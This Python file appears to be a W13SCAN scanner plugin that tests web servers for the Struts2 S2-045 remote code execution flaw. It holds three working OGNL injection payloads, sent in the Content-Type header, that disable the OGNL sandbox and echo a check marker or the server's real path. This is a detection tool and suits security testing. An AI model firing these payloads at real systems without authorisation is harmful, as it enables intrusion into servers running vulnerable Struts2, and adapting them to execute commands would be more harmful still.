#coding   :utf-8
#file     : struts2_045.py
#author   : go0p
#time     : 2019/8/17 12:00 PM
#software :PyCharm

import copy
import os

import requests

from W13SCAN.lib.common import prepare_url
from W13SCAN.lib.const import acceptedExt, ignoreParams, Level
from W13SCAN.lib.output import out
from W13SCAN.lib.plugins import PluginBase

class W13SCAN(PluginBase):
    name = 'Struts2-045远程代码执行'
    desc = '''Get请求方式'''
    level = Level.HIGHT

    def audit(self):
        method = self.requests.command  # 请求方式 GET or POST
        headers = self.requests.get_headers()  # 请求头 dict类型
        url = self.build_url()  # 请求完整URL
        resp_data = self.response.get_body_data()  # 返回数据 byte类型
        resp_str = self.response.get_body_str()  # 返回数据 str类型 自动解码
        resp_headers = self.response.get_headers()  # 返回头 dict类型
        p = self.requests.urlparse
        params = self.requests.params
        netloc = self.requests.netloc
        if self.response.language and self.response.language != "JAVA":
            return
        if method == 'GET':
            exi = os.path.splitext(p.path)[1]
            if exi not in acceptedExt:
                return
            check=  '<Struts2-vuln-Check>'
            payloads = [
                r"%{(#nikenb='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#context.setMemberAccess(#dm)))).(#o=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(#o.println('<'+'Struts2-vuln-'+'Check>')).(#o.close())}",
                r"%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#context.setMemberAccess(#dm)))).(#o=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#path=#req.getRealPath('Struts2-vuln-'+'Check>')).(#o.println(#path)).(#o.close())}",
                r'''%{(#fuck='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#outstr=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(#outstr.println(#req.getRealPath("Struts2-vuln-"+"Check>"))).(#outstr.close()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}'''
            ]

            for payload in payloads:
                headers['Content-Type']= payload
                r = requests.get(url, headers=headers)
                html1 = r.text
                if check in html1:
                    out.success(url, self.name, playload="{}:{}".format('Content-Type',payload), method=method,check=check,raw=r.raw)
                    break